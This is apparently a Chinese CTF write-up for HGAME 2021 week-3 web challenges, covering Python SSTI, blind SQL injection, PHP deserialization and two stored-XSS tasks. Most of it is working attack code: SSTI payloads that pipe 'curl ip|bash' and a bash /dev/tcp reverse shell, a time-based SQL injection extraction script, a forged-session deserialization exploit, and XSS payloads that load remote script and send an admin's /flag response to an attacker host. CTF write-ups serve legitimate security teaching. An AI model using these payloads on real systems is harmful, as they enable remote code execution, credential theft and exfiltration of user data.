> 原文链接: https://www.anquanke.com//post/id/231948 


# HGAME 2021 week3-web wp


                                阅读量   
                                **122462**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01bb34ac6669ccf870.jpg)](https://p0.ssl.qhimg.com/t01bb34ac6669ccf870.jpg)



作者：wh1sper@星盟

## Level – Week3

### <a class="reference-link" name="Forgetful"></a>Forgetful

考点：简单python-SSTI

[![](https://p4.ssl.qhimg.com/t01d04ce9cd2dc320de.png)](https://p4.ssl.qhimg.com/t01d04ce9cd2dc320de.png)

题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：

[![](https://p2.ssl.qhimg.com/t013043f41c26080031.png)](https://p2.ssl.qhimg.com/t013043f41c26080031.png)

最为常规的payload：

```
`{``{`[].__class__.__mro__[1].__subclasses__()`}``}`
`{``{`[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('ls /').read()`}``}`
`{``{`[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('curl ip|bash').read()`}``}`
```

因为命令执行处有waf，所以可以选择直接弹shell：

```
nc -lvnp 8888
bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1
```

姿势还是比较常规；

分享一个从`[].__class__.__mro__[1].__subclasses__()`查找模块位置的脚本：

```
#python 3
import re
str = '''
[回显内容]
'''

list = re.split(',', str)

for i in range(0, len(list)):
      if 'catch_warnings' in list[i]:
            print(i)
            break
```

### <a class="reference-link" name="iki-Jail"></a>iki-Jail

考点：MySQL注入，单引号逃逸

熟悉的登录框，熟悉的sql注入

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e755bd04832b8519.png)

发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。

于是直接使用bp对`login.php`发包；

进行了简单的fuzz，过滤如下：

[![](https://p3.ssl.qhimg.com/t0122ef0cd9ee72e0d9.png)](https://p3.ssl.qhimg.com/t0122ef0cd9ee72e0d9.png)

由单双引号过滤想到了`\`逃逸单引号，当我们用户名输入`admin\`的时候，语句变成了：

```
SELECT * FROM user WHERE username='admin\' AND password='xxx'

```

那么`xxx`就变成了sql语句执行，造成了注入；

结果发现只能延时注入：

[![](https://p1.ssl.qhimg.com/t0129b4b7be17ab48ec.png)](https://p1.ssl.qhimg.com/t0129b4b7be17ab48ec.png)

exp：

```
#python3,wh1sper
import requests
import time

host = 'https://jailbreak.liki.link/login.php'

def mid(bot, top):
    return (int)(0.5*(top+bot))

def transToHex(flag):
    res = ''
    for i in flag:
        res += hex(ord(i))
    res = '0x' + res.replace('0x', '')
    return res

def sqli():
    name = ''
    for j in range(1, 200):
        top = 126
        bot = 32
        while top &gt; bot:
            babyselect = '(database())'#week3sqli
            babyselect = "(select group_concat(table_name) from information_schema.TABLES where table_schema like database())"#u5ers
            babyselect = "(select group_concat(column_name) from information_schema.columns where table_name like 0x7535657273)"#usern@me,p@ssword
            babyselect = "(select `p@ssword` from week3sqli.u5ers)"#sOme7hiNgseCretw4sHidd3n
            babyselect = "(select `usern@me` from week3sqli.u5ers)"#admin
            payload = "^(if((ascii(substr(`{``}`,`{``}`,1))&gt;`{``}`),1,sleep(2)))#".format(babyselect, j, mid(bot, top))
            data = `{`
                "username": "admin\\",
                "password": payload.replace(' ', '/**/')
                #^(if((ascii(1)&gt;55),sleep(3),sleep(3)))#这个确实延时成功了
            `}`
            try:
                start = time.time()
                r = requests.post(url=host, data=data)
                print(data)
                print(time.time()-start)
                if time.time()-start &lt; 1.5:
                    bot = mid(bot, top) + 1
                else:
                    top = mid(bot, top)
            except:
                continue
        name += chr(top)
        print(name)

if __name__ == '__main__':
    sqli()
    #hgame`{`7imeB4se_injeCti0n+hiDe~th3^5ecRets`}`
```

hgame`{`7imeB4se_injeCti0n+hiDe~th3^5ecRets`}`

### <a class="reference-link" name="Arknights"></a>Arknights

考点：PHP反序列化

[![](https://p0.ssl.qhimg.com/t011a55816c00cd9a0b.png)](https://p0.ssl.qhimg.com/t011a55816c00cd9a0b.png)

题目是一个类似于抽卡的网站，描述里面说”r4u用git部署到了自己的服务器上”，那么自然而然Githack把源码hack下来。

[source.zip](https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DArknights.zip)

在`simulator.php`我们可以看到有很多类，其中第146行

```
class Eeeeeeevallllllll`{`
    public $msg="坏坏liki到此一游";

    public function __destruct()
    `{`
        echo $this-&gt;msg;
    `}`
`}`
```

有一个echo操作，那么我们全局搜索`__toString`。第93行：

```
class CardsPool`{`
    ……

    public function __toString()`{`
        return file_get_contents($this-&gt;file);
    `}`
`}`
```

pop链很明确，就看如何触发反序列化了。

第137行`Session::extract()`:

```
public function extract($session)`{`

        $sess_array = explode(".", $session);
        $data = base64_decode($sess_array[0]);
        $sign = base64_decode($sess_array[1]);

        if($sign === md5($data . self::secret_key))`{`
            $this-&gt;sessiondata = unserialize($data);
        `}`else`{`
            unset($this-&gt;sessiondata);
            die("go away! you hacker!");
        `}`
```

他会把session的`.`前面的内容反序列化，并且会做一个加盐的判断，但是密钥在103行已经给了

```
const SECRET_KEY = "7tH1PKviC9ncELTA1fPysf6NYq7z7IA9";
```

那么我们可以编写一个exp：

```
&lt;?php
class Eeeeeeevallllllll
`{`
    public $msg = 'a';

`}`

class CardsPool
`{`

    public $cards;
    private $file = 'flag.php';

`}`

$pop = new Eeeeeeevallllllll();
$pop-&gt;msg = new CardsPool();
//echo serialize($pop);
$key = "7tH1PKviC9ncELTA1fPysf6NYq7z7IA9";
$sign = md5(serialize($pop).$key);
$payload = base64_encode(serialize($pop)).'.'.base64_encode($sign);
echo $payload;
/*
$sess_array = explode(".", $payload);
$data = base64_decode($sess_array[0]);
echo $data,"\n";
$sign = base64_decode($sess_array[1]);
echo $sign,"\n";
if($sign === md5($data . $key))`{`
    unserialize($data);
`}`else`{`
    echo $sign;
    die("go away! you hacker!");
`}`
*/
```

发送session即可得到flag

[![](https://p5.ssl.qhimg.com/t018da760b83a88a22a.png)](https://p5.ssl.qhimg.com/t018da760b83a88a22a.png)

### <a class="reference-link" name="Post%20to%20zuckonit2.0"></a>Post to zuckonit2.0

考点：XSS

网站是一个创建笔记的站点，存在XSS漏洞

[![](https://p4.ssl.qhimg.com/t018cb1fd6693278e08.png)](https://p4.ssl.qhimg.com/t018cb1fd6693278e08.png)

在`/static/www.zip`给了源码：[source.zip](https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0.zip)

和week2的XSS比起来多一个功能，可以替换批量字符串，并且在`/preview`查看替换的结果

审计源码，在添加留言的存在一个waf：

[![](https://p0.ssl.qhimg.com/t01f1764695e162a220.png)](https://p0.ssl.qhimg.com/t01f1764695e162a220.png)

跟进函数：

```
def escape_index(original):
    content = original
    content_iframe = re.sub(r"^(&lt;?/?iframe)\s+.*?(src=[\"'][a-zA-Z/]`{`1,8`}`[\"']).*?(&gt;?)$", r"\1 \2 \3", content)#只留src属性
    if content_iframe != content or re.match(r"^(&lt;?/?iframe)\s+(src=[\"'][a-zA-Z/]`{`1,8`}`[\"'])$", content):
        return content_iframe
    else:
        content = re.sub(r"&lt;*/?(.*?)&gt;?", r"\1", content)
        return content
```

可以看到只允许我们添加类似于`&lt;iframe src="xxx"&gt;`的标签，并且`xxx`限制在1-8位，显然没办法直接执行JS。

不过我们可以添加`&lt;iframe src="/preview "&gt;`来使得index能直接看到`/preview`页面：

[![](https://p5.ssl.qhimg.com/t0163249b48587eb05f.png)](https://p5.ssl.qhimg.com/t0163249b48587eb05f.png)

再通过字符串替换功能，把`xxx`换成`javascript:xxxxx`，形成`&lt;iframe src='javascript:alter(1)'&gt;`即可XSS

payload：

```
javascript:document.write(atob('PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL2Nvb2tpZS5qcyI+PC9zY3JpcHQ+'));
```

小手一抖，cookie到手：

[![](https://p4.ssl.qhimg.com/t01af2ce5cb8fa8bec7.png)](https://p4.ssl.qhimg.com/t01af2ce5cb8fa8bec7.png)

hgame`{`simple_csp_bypass&amp;a_small_mistake_on_the_replace_function`}`

### <a class="reference-link" name="Post%20to%20zuckonit%20another%20version"></a>Post to zuckonit another version

考点：XSS，HttpOnly绕过

说是绕`HttpOnly`，实则并没有绕；

相比于上一道XSS：
<li>增加了HttpOnly，使得我们直接用js不能直接获取到本地cookie；[![](https://p2.ssl.qhimg.com/t0174ea6c228c4dbbd2.png)](https://p2.ssl.qhimg.com/t0174ea6c228c4dbbd2.png)
</li>
<li>修改了功能，把直接替换字符串换成了查找字符串[![](https://p3.ssl.qhimg.com/t01c3c3a99ce804d4e8.png)](https://p3.ssl.qhimg.com/t01c3c3a99ce804d4e8.png)
</li>
依然在`static/www.zip`给出了源码：[source.zip](https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0_another_version.zip)

源码大同小异，甚至连waf都没变，单独在字符串替换功能上修改为正则匹配并且在两端加`&lt;b&gt;`标签，得到高亮效果

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d0e4ce3d5caa8302.png)

如果按照正常思维来查找’a’字符串的话，效果就如下图：

[![](https://p4.ssl.qhimg.com/t01e52f9e6a3db70697.png)](https://p4.ssl.qhimg.com/t01e52f9e6a3db70697.png)

但是我们应当注意到，这个高亮实际上还是由`String.prototype.replace()`方法来进行**正则替换**的，那么我们如果输入`.*`之类的关键词进行高亮就会出现意想不到的效果：

[![](https://p1.ssl.qhimg.com/t01de1b291cc785641e.png)](https://p1.ssl.qhimg.com/t01de1b291cc785641e.png)

没错，因为正则替换让我们得以有机可乘

思路还是一样，先利用替换构造好XSS，再利用`&lt;iframe src='/preview'&gt;`来触发0-click

payload：

```
&lt;iframe src='/preview'&gt;
&lt;iframe src='AAA' &gt;
```

替换的payload：

```
AAA('srcdoc='&amp;lt;img src=1 onerror=document.write(atob('PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg=='));&amp;gt;')*

```

替换之后其实是这样：

[![](https://p1.ssl.qhimg.com/t0131c5622373f01652.png)](https://p1.ssl.qhimg.com/t0131c5622373f01652.png)

实际上是利用了iframe标签的srcdoc属性和HTML实体编码来绕过

```
&lt;iframe src="&lt;b class=&amp;quot;search_result&amp;quot;&gt;AAA(" srcdoc="&lt;img src=1 onerror=document.write(atob('PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg=='));&gt;" )*&lt;="" b=""&gt;' &gt;&lt;/iframe&gt;
```

结果一目了然；

而iframe里面`&lt;script&gt;`指向的JS：

```
xmlhttp = new XMLHttpRequest();
//是否能跨域
xmlhttp.withCredentials = true;
xmlhttp.onreadystatechange = function() `{`
    if (xmlhttp.readyState == 4) `{`
        location.href = 'http://ip/?cookie=' + btoa(xmlhttp.responseText)
        //得用btoa()进行base64编码，不然flag会很神必
        //尝试getAllResponseHeaders()不行，因为HttpOnly的Set-Cookie头不适用
    `}`
`}`;
//设置连接信息
//第一个参数表示http的请求方式，支持所有http的请求方式，主要使用get和post
//第二个参数表示请求的url地址，get方式请求的参数也在url中
//第三个参数表示采用异步还是同步方式交互，true表示异步
xmlhttp.open('GET', '/flag', true);
//4.发送数据，开始和服务器端进行交互
//同步方式下，send这句话会在服务器段数据回来后才执行完
//异步方式下，send这句话会立即完成执行
xmlhttp.send('');
```

不能绕HttpOnly来获取cookie，但是我们可以直接让admin请求`/flag`，把responseText发给我们就行了；

这个是本地打的结果：

[![](https://p1.ssl.qhimg.com/t0198e4d7a27320c842.png)](https://p1.ssl.qhimg.com/t0198e4d7a27320c842.png)

大手一抖，flag到手：

[![](https://p2.ssl.qhimg.com/t0104af98d34c885a5a.png)](https://p2.ssl.qhimg.com/t0104af98d34c885a5a.png)

因为flag里面出题人故意放了`&amp;`字符让我们踩坑，打出来的responseText需要base64编码。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019eac8b25f558c6c7.png)

下面这个才对。

[![](https://p0.ssl.qhimg.com/t01232f59a523828797.png)](https://p0.ssl.qhimg.com/t01232f59a523828797.png)
